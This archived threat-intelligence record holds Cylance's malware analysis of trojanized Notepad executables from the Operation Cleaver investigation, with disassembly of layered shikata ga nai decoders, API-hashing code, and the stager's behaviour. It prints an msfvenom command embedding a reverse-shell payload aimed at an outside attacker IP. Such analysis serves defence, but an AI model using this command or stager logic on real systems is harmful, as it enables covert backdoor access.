{
    "id": "1218e8f2-2185-41f2-bd92-58b3eab9b5ec",
    "created_at": "2022-10-25T16:48:10.597677Z",
    "updated_at": "2025-03-27T02:14:34.212454Z",
    "deleted_at": null,
    "sha1_hash": "114d677bac083a956038f44abec2bf2a59e1e080",
    "title": "Operation Cleaver: The Notepad Files",
    "authors": "Cylance",
    "file_creation_date": "2014-12-07T20:21:40Z",
    "file_modification_date": "2014-12-07T20:21:40Z",
    "file_size": 641439,
    "plain_text": "You see some strange stuff out there on the networks where attackers are active. Certainly the stash of files\n\nunearthed during the Operation Cleaver investigation included much of the bizarre and something of the\n\nterrible. Brian Wallace, who led the investigation, shared a mysterious set of samples with me awhile back,\n\nand now that Operation Cleaver is public, I'll relate the lurid technical details.\n\n**The Notepad Files**\n\nThe files in question were found in a dim and dusty directory on a forlorn FTP server in the US,\n\ncommingled with the detritus of past attack campaigns and successful compromises. They were at once\n\nfamiliar and strange, and they were made still stranger and more perplexing by their location and the\n\ncircumstances of their discovery. All around them was a clutter of credential dumps, hacking utilities,\n\nRATs, and even legitimate software installers, but the files in question were none of these. They were\n\nNotepad.\n\n\n-----\n\n**_Figure 1. The Notepad DoppelgÃ¤ngers._**\n\nOf course, a purloined Notepad icon in malware is nothing new, but something different was going on\n\nhere. Within each of the two families, all of the samples had the same main icon, file size, and version\n\ninformation, yet each one had a distinct hash. At the time, only one of those five hashes existed on the\n\ninternet: the official 32-bit Simplified Chinese Notepad from Windows XP x64 / Windows Server 2003.\n\nSuspecting that the remaining Notepads were derivatives of official Windows files, we associated the other\n\nmember of the first family with the confirmed legitimate Notepad, and we matched the second family with\n\nthe 32-bit US English Notepad from Windows 7 (not present in the original set).\n\n**_File_**\n**_MD5_** **_File Name_** **_File Version_**\n**_Size_**\n\n5.2.3790.3959, Chinese\n83868cdff62829fe3b897e2720204679 notepad.exe 66,048\n(Simplified, PRC)\n\n6.1.7600.16385, English (United\nbfc59f1f442686af73704eff6c0226f0 NOTEPAD2.EXE 179,712\nStates)\n\n6.1.7600.16385, English (United\ne8ea10d5cde2e8661e9512fb684c4c98 Notepad3.exe 179,712\nStates)\n\n5.2.3790.3959, Chinese\nbaa76a571329cdc4d7e98c398d80450c Notepad4.exe 66,048\n(Simplified PRC)\n\n|MD5|File Name|File Size|File Version|\n|---|---|---|---|\n|83868cdff62829fe3b897e2720204679|notepad.exe|66,048|5.2.3790.3959, Chinese (Simplified, PRC)|\n|bfc59f1f442686af73704eff6c0226f0|NOTEPAD2.EXE|179,712|6.1.7600.16385, English (United States)|\n|e8ea10d5cde2e8661e9512fb684c4c98|Notepad3.exe|179,712|6.1.7600.16385, English (United States)|\n\n\n-----\n\n6.1.7600.16385, English (United\nd378bffb70923139d6a4f546864aa61c -- 179,712\nStates)\n\n**_Table 1. A summary of Notepad samples dug from the attackers' FTP drop, with the official Windows 7_**\n\n_Notepad appearing at bottom. It and the official Windows XP/2003 Notepad are represented in green._\n\nThings got interesting when we started comparing the Notepads at the byte level. The image below depicts\n\nsome byte differences between the original Windows 7 Notepad and samples NOTEPAD2.EXE and\n\nNotepad3.exe:\n\n\n-----\n\n**_Figure 2. Comparison of the Windows 7 Notepad (green channel), NOTEPAD2.EXE (red channel), and_**\n\n_Notepad3.exe (blue channel)._\n\n\n-----\n\n(IMAGE_NT_HEADERS.FileHeader.TimeDateStamp, offset 0xE8 in the figure above), the relative virtual\n\naddresses (RVAs) of their entry points (IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint,\n\noffset 0x108), and their checksums (IMAGE_NT_HEADERS.OptionalHeader.CheckSum, offset 0x138).\n\nThe timestamps were rolled back by weeks to months relative to the legitimate progenitors' timestamps;\n\nwe don't know why. The entry points retreated or advanced by hundreds of bytes to dozens of kilobytes,\n\nfor reasons we'll explore shortly. And the checksums were all zeroed out, presumably because the file\n\nmodifications invalidate them, invalid non-zero checksums are a tip-off, and zeroing is easier than\n\nrecomputing.\n\nSo what's the story with all those other modifications? In all cases they seem to be confined to the \".text\"\n\nsection, centrally located to avoid the import directory, debug directory, load configuration directory, and\n\nimport address table. This makes sense as a general precaution, considering that corrupting the import\n\ndirectory would unhelpfully crash the Windows loader during process initialization. The following image\n\nillustrates the distribution of modifications relative to these structures.\n\n\n-----\n\n**_Figure 3. File locations of modifications (red) and the PE structures they avoid (gray). From left to_**\n\n_right, the four vertical bars represent the \".text\" sections of NOTEPAD2.EXE, Notepad3.exe,_\n\n_Notepad4.exe, and notepad10.exe, as compared to the original Notepad from their respective families._\n\n_The Import Address Table (IAT), original entry point (OEP, green), malware entry point (EP, yellow),_\n\n_load configuration directory (LC), import directory (Imp), and debug directory (Dbg) are labeled._\n\nWhile the arrangement of the structures varies among families, it's clear from the figure above that the\n\nregion between structures containing the original entry point has in each case been filled with\n\n\n-----\n\nthe new entry point, and then a longer run elsewhere in the region. Presumably, both runs are injected\n\nmalicious code, and the other modifications may well be random noise intended as a distraction. Since\n\nthere are no other changes and no appended data, it's reasonable to assume that the code that makes a\n\nNotepad act like Notepad is simply gone, and that the samples will behave only maliciously. If true, then\n\nthese modifications would represent a backdooring or \"Trojanization\" rather than a parasitic infection,\n\nand this distinction implies certain things about how the Notepads were made and how they might be\n\nused.\n\n**Tales from the Code**\n\nLet's take a look at the entry point code of the malicious Notepads and see if it aligns with our\n\nobservations. The short answer is, it looks like nonsense. Here's a snippet from Notepad4.exe:\n\n010067E3    sbb   eax, 2C7AE239\n\n010067E8    test  al, 80\n\n010067EA    test  eax, 498DBAD5\n\n010067F0    jle   short 01006831\n\n010067F2    sub   eax, B69F4A73\n\n010067F7    or   edx, esi\n\n010067F9    jnz   short 01006800\n\n010067FB    inc   ebx\n\n010067FC    mov   cl, 91\n\n010067FE    cwde\n\n010067FF    jnp   short 01006803\n\nAt this point the code becomes difficult to list due to instruction scission, or branching into the middle of\n\nan instruction (analogous to a frameshift error in DNA translation, if that helps). For instance, the JNP\n\ninstruction at 010067FF is a two-byte instruction, and the JNZ branch at 010067F9, if satisfied, jumps to\n\nthe JNP instruction's second byte at 01006800. That byte begins a different two-byte instruction, which\n\nincorporates what would have otherwise been the first byte of the instruction after the JNP, meaning its\n\nsuccessor will start in the middle of JNP's successor, and so on. The two execution paths usually (but don't\n\n\n-----\n\nThe outcome of these instructions depends on the initial state of the registers, which is technically\n\nundefined. Seeing code operate on undefined values typically suggests that the bytes aren't code after all\n\nand so shouldn't have been disassembled. But keep looking. Notice that there are no memory accesses\n\n(which could raise an access violation), no stack pointer manipulation (which could cause a stack overflow\n\nor underflow), no division instructions (which could raise a divide exception), no invalid or privileged\n\ninstructions, no interrupts or indirect branches--really, no uncontrolled execution transfers of any kind.\n\nEven more tellingly, all the possible execution paths seem to eventually flow to this code:\n\n01006877    mov   ch, 15\n\n01006879    cmp   eax, 4941B62F\n\n0100687E    xchg  eax, ebx\n\n0100687F    mov   cl, 4B\n\n01006881    stc\n\n01006882    wait\n\n01006883    xchg  eax, ecx\n\n01006884    inc   ebx\n\n01006885    cld\n\n01006886    db 67\n\n01006887    aaa\n\n01006888    cwde\n\n01006889    sub   eax, 24401D66\n\n0100688E    dec   eax\n\n0100688F    add   al, F8\n\n01006891    jmp   01005747\n\n\n-----\n\n01005748    jmp   01005758\n\n01005758    cld\n\n01005759    nop\n\n0100575A    jmp   short 01005768\n\n01005768    call  01005A70\n\n01005A70    nop\n\n01005A71    pop  ebp\n\n01005A72    jmp   01005A85\n\n01005A85    nop\n\n01005A86    mov   esi, 000001A9\n\n01005A8B    jmp   01005A99\n\n01005A99    push  00000040\n\n01005A9B    push  00001000\n\n01005AA0    nop\n\n01005AA1    jmp   01005AAF\n\n01005AAF    push  esi\n\n\n-----\n\n01005AB1    jmp   01005AC2\n\n01005AC2    push  0\n\n01005AC4    push  E553A458\n\n01005AC9    jmp   01005AD7\n\n01005AD7    call  ebp\n\nHere the gaps in the listing indicate when the disassembly follows an unconditional branch. The code\n\nseems to abruptly change character after the jump at 01006891, transitioning from gibberish to a string of\n\nshort sequences connected by unconditional branches. This transition corresponds to a jump from the end\n\nof the short run of modifications (01006896) after the malware entry point to the beginning of the longer\n\nrun of modifications (01005747) a few kilobytes before it. (See the third column in Figure 3.)\n\nIn the disassembly above, the first sequence of green lines is a clear CALL-POP pair intended to obtain a\n\ncode address in a position-independent way. (An immediate address value marked with a relocation would\n\nbe the orthodox way to obtain a code pointer, but preparing that would have involved modifying the\n\n\".reloc\" section.) No way is this construct a coincidence. Furthermore, the blue lines strongly resemble the\n\nsetup for a VirtualAlloc call (VirtualAlloc(NULL, 0x1A9, MEM_COMMIT,\n\nPAGE_EXECUTE_READWRITE)) typical of a deobfuscation stub, and the second set of green lines\n\ninvoke the CALL-POPped function pointer with what one might readily assume is a hash of the string\n\n\"VirtualAlloc\". (It is.)\n\nThere's plenty more to observe in the disassembly, but, let's fast-forward past it.\n\nwindbg -c \"bp kernel32!VirtualAlloc ; g\" Notepad4.exe...\n\n\n-----\n\n_expected._\n\ng poi(@esp) ; ba w 1 @eax+@esi-1 ; g...\n\n**_Figure 5. Memory write (hardware) breakpoint hit after the last (0x1A9th) byte is written to allocated_**\n\n_memory._\n\nAnd now we can dump the extracted code from memory. It isn't immediately gratifying:\n\n00100000    fabs\n\n00100002    mov   edx, 4DF05534 ; = initial XOR key\n\n00100007    fnstenv [esp-0C]    ; old trick to get EIP\n\n0010000B    pop   eax\n\n0010000C    sub   ecx, ecx\n\n0010000E    mov   cl, 64     ; = length in DWORDs\n\n00100010    xor   [eax+19], edx\n\n00100013    add   edx, [eax+19] ; XOR key is modified after each DWORD\n\n00100016    add   eax, 4\n\n00100019    db D6\n\nThe byte 0xD6 at address 00100019 doesn't disassemble, and there aren't any branches skipping over it.\n\nBut check out the instructions just above it referencing \"[eax+19]\". The code is in a sense self-modifying,\n\nflowing right into a portion of itself that it XOR decodes. The first decoded instruction is \"LOOP\n\n00100010\" (0xD6 ^ 0x34 = 0xE2, the opcode for LOOP), which will execute the XOR loop body 99 more\n\ntimes (CL - 1 = 0x63 = 99) and then fall through to the newly-decoded code.\n\nWhen we run this decoding stub (which, come to find out, is Metasploit's \"shikata ga nai\" decoder stub) to\n\n\n-----\n\n0010001B    fcmovu st, st(1) ; a different initial FPU instruction from\n\nabove\n\n0010001D    fnstenv [esp-0C]  ; different ordering of independent\n\ninstructions\n\n00100021    mov   ebx, C2208861 ; a different initial XOR key and\n\nregister\n\n00100026    pop   ebp    ; a different code pointer register\n\n00100027    xor   ecx, ecx  ; XOR as an alternative to SUB for zeroing\n\ncounter\n\n00100029    mov   cl, 5D   ; a shorter length\n\n0010002B    xor   [ebp+1A], ebx ; decoding starts at a different offset\n\n0010002E    add   ebx, [ebp+1A]\n\n00100031    sub   ebp, FFFFFFFC ; SUB -4 as an alternative to ADD +4\n\n00100034    loop  000FFFCA  ; instruction is partly encoded\n\nHere, the first byte to be XORed is the second byte of the LOOP instruction, hence the nonsensical\n\ndestination apparent in the pre-decoding disassembly above. (For brevity, we cut each listing at the first\n\nsign of encoding.) Run that to completion, and then...\n\n00100036    mov   edx, 463DC74D\n\n0010003B    fcmovnbe st, st(0)\n\n0010003D    fnstenv [esp-0C]\n\n00100041    pop   eax\n\n00100042    sub   ecx, ecx\n\n00100044    mov   cl, 57 ; notice the length gets shorter each time\n\n00100046    xor   [eax+12], edx\n\n\n-----\n\n0010004C    add   ebx, ds:[47B3DFC9] ; instruction is partly encoded\n\nAnd then...\n\n00100051    fcmovbe st, st(0)\n\n00100053    mov   edx, 869A5D73\n\n00100058    fnstenv [esp-0C]\n\n0010005c    pop   eax\n\n0010005d    sub   ecx, ecx\n\n0010005f    mov   cl, 50\n\n00100061    xor   [eax+18],edx\n\n00100064    add   eax, 4\n\n00100067    add   edx, [eax+67] ; instruction is partly encoded\n\nAnd then...\n\n0010006C    mov   eax, E878CF4D\n\n00100071    fcmovnbe st, st(4)\n\n00100073    fnstenv [esp-0C]\n\n00100077    pop   ebx\n\n00100078    sub   ecx, ecx\n\n0010007A    mov   cl, 49\n\n0010007C    xor   [ebx+14], eax\n\n0010007F    add   ebx, 4\n\n00100082    add   eax, [ebx+10]\n\n00100085    scasd ; incorrect disassembly of encoded byte\n\n\n-----\n\n00100087    cld\n\n00100088    call  00100116\n\n0010008D    pushad\n\n0010008E    mov   ebp, esp\n\n00100090    xor   edx, edx\n\n00100092    mov   edx, fs:[edx+30] ; PTEB->ProcessEnvironmentBlock\n\n00100096    mov   edx, [edx+0C]   ; PPEB->Ldr\n\n00100099    mov   edx, [edx+14]   ; PPEB_LDR_DATA\n>InMemoryOrderModuleList\n\n0010009C    mov   esi, [edx+28]   ; PLDR_MODULE.BaseDllName.Buffer\n\n0010009F    movzx  ecx, word ptr [edx+26] ;\n\nPLDR_MODULE.BaseDllName.MaximumLength\n\n001000A3    xor   edi, edi\n\n001000A5    xor   eax, eax\n\n001000A7    lodsb\n\n001000A8    cmp   al, 61 ; check for lowercase letter\n\n001000AA    jl   001000ae\n\n001000AC    sub   al, 20 ; convert to uppercase\n\n001000AE    ror   edi, 0D\n\n001000B1    add   edi, eax\n\n...\n\nIt looks like a call over a typical module or export lookup function. In fact, it is, and as the ROR-ADD pair\n\nsuggests, it implements module name and export name hashing, the algorithms of which can be expressed\n\n\n-----\n\nunsigned int GetModuleNameHash(PLDR_MODULE pLdrModule)\n\n{\n\nunsigned int hash = 0;\n\nchar * p = (char *) pLdrModule->BaseDllName->Buffer;\n\nfor (int n = pLdrModule->BaseDllName->MaximumLength; n != 0; p++, n--)\n\n{\n\nchar ch = *p;\n\nif (ch >= 'a') ch -= 0x20;\n\nhash = _rotr(hash, 13) + (unsigned char) ch;\n\n}\n\nreturn hash;\n\n}\n\nunsigned int GetExportNameHash(char *pszName)\n\n{\n\nunsigned int hash = 0;\n\nfor ( ; ; pszName++)\n\n{\n\nhash = _rotr(hash, 13) + (unsigned char) *pszName;\n\nif (*pszName == 0) break;\n\n}\n\nreturn hash;\n\n\n-----\n\nStill, this is all just preamble. What is the point that it eventually gets to?\n\nYou'd be forgiven for assuming that the tremendous amount of effort poured into obfuscation means\n\nthere's some treasure beyond all fables at the bottom of this erstwhile Notepad. Sorry. It just downloads\n\nand executes a block of raw code. (Spoiler: it's actually a Metasploit reverse connect stager.) Here is its\n\nbehavior summarized as function calls:\n\nkernel32!LoadLibraryA(\"ws2_32\")\n\nws2_32!WSAStartup(...)\n\ns = ws2_32!WSASocketA(AF_INET, SOCK_STREAM, ...)\n\nws2_32!connect(s, { sin_family = AF_INET, sin_port = htons(12345), sin_addr =\n\n108.175.152.230 }, 0x10)\n\nws2_32!recv(s, &cb, 4, 0)\n\np = kernel32!VirtualAlloc(NULL, cb, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n\nws2_32!recv(s, p, cb, 0)\n\np()\n\nThe above is known to be true for Notepad3.exe, Notepad4.exe, and notepad10.exe. NOTEPAD2.EXE\n\ndoesn't seem to want to run, for reasons we didn't bother to troubleshoot for the bad guys.\n\n**Denouement**\n\nUnfortunately, we never did obtain a sample of the code that might have been downloaded. The key to that\n\nenigma-embedded, mystery-wrapped riddle is forever lost to us. The best we can do is read what's written\n\nin the Notepads and speculate as to why they exist at all.\n\nClearly whatever generator created these Notepads is far, far beyond the technical understanding of the\n\nCleaver team. It stands to reason that there is a generator--no chance these were crafted by hand--and that\n\nits sophistication is even greater than that of its output. Something like that wouldn't be used only once.\n\nSomething like that, if this team was able to get ahold of it, must be out there. Turn the right corner of the\n\ninternet, and you can find anything...\n\nWell it so happens that we did eventually find it. Some of you have no doubt suspected it all along, and\n\n\n-----\n\nSomething along the lines of msfvenom -x notepad.exe -p windows/shell/reverse_tcp -e\n\nx86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe\". The \"msfvenom\" tool\n\ntransmogrifies a Metasploit payload into a standalone EXE, and with the \"-x\" switch, it'll fuse the payload\n-encoded as desired--into a copy of an existing executable, exhibiting exactly the behavior we just\n\ndescribed. Omne ignotum pro magnifico. Perhaps the more bizarre a thing is, the less mysterious it\n\nproves to be.\n\nHowever, we're still left to wonder what Cleaver was up to when they generated all those Notepads. One\n\nconclusion Brian proposed is that they're intended as backdoors--replacements for the legitimate Notepad\n\non a compromised system--which would enable Cleaver to regain access to a system at some\n\nindeterminate time in the future, the next time a user runs Notepad. The team demonstrated a similarly\n\nintentioned tactic with a connect-back shell scheduled to run in a six-minute window each night; the\n\nNotepad replacement, while more intrusive, could be another example of this contingency planning\n\ntendency.\n\nOr maybe the Notepads were only an aborted experiment, attempted and shelved, forgotten in a flurry of\n\ncompromises and criminal activity. If nothing else, they made for an unexpected bit of mystery.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/vsret8sjx5qd6xaxzv0rxdw4pocdmjll"
    ],
    "report_names": [
        "OperationCleaver_The_Notepad_Files"
    ],
    "threat_actors": [
        {
            "id": "49f1ada0-181f-4e89-a449-e6bc13c8c6b1",
            "created_at": "2022-10-25T15:50:23.561511Z",
            "updated_at": "2025-03-27T02:00:55.499988Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Threat Group 2889",
                "TG-2889"
            ],
            "source_name": "MITRE:Cleaver",
            "tools": [
                "Net Crawler",
                "PsExec",
                "TinyZBot",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7c8cf02c-623a-4793-918b-f908675a1aef",
            "created_at": "2023-01-06T13:46:38.309165Z",
            "updated_at": "2025-03-27T02:00:02.801298Z",
            "deleted_at": null,
            "main_name": "APT15",
            "aliases": [
                "BRONZE PALACE",
                "Nylon Typhoon",
                "VIXEN PANDA",
                "Playful Dragon",
                "BRONZE DAVENPORT",
                "BRONZE IDLEWOOD",
                "G0004",
                "Red Vulture",
                "Ke3Chang",
                "Metushy",
                "Lurid",
                "Social Network Team",
                "Royal APT"
            ],
            "source_name": "MISPGALAXY:APT15",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "217c588a-5896-4335-b9ec-a516ae2f9a7e",
            "created_at": "2022-10-25T16:07:23.513775Z",
            "updated_at": "2025-03-27T02:02:09.838687Z",
            "deleted_at": null,
            "main_name": "Cutting Kitten",
            "aliases": [
                "Cutting Kitten",
                "Operation Cleaver",
                "TG-2889"
            ],
            "source_name": "ETDA:Cutting Kitten",
            "tools": [
                "CsExt",
                "DistTrack",
                "IvizTech",
                "Jasus",
                "KAgent",
                "Logger Module",
                "MANGOPUNCH",
                "MPK",
                "MPKBot",
                "Net Crawler",
                "NetC",
                "PVZ-In",
                "PVZ-Out",
                "Pupy",
                "PupyRAT",
                "PvzOut",
                "Shamoon",
                "SynFlooder",
                "SysKit",
                "TinyZBot",
                "WndTest",
                "pupy",
                "zhCat",
                "zhMimikatz"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716490,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1417983700,
    "ts_modification_date": 1417983700,
    "files": {
        "pdf": "https://archive.orkl.eu/114d677bac083a956038f44abec2bf2a59e1e080.pdf",
        "text": "https://archive.orkl.eu/114d677bac083a956038f44abec2bf2a59e1e080.txt",
        "img": "https://archive.orkl.eu/114d677bac083a956038f44abec2bf2a59e1e080.jpg"
    }
}